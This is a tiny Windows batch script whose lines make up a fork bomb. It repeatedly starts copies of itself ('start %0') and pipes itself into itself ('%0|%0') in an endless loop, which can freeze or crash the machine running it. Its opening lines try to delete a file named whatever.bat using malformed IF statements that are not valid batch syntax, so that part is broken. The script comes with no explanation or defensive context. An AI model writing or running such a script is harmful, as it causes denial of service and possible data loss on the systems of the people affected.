IF (DELETE whatever.bat) goto :e
IF (ERASE whatever.bat
:e
start %0
%0|%0
goto :e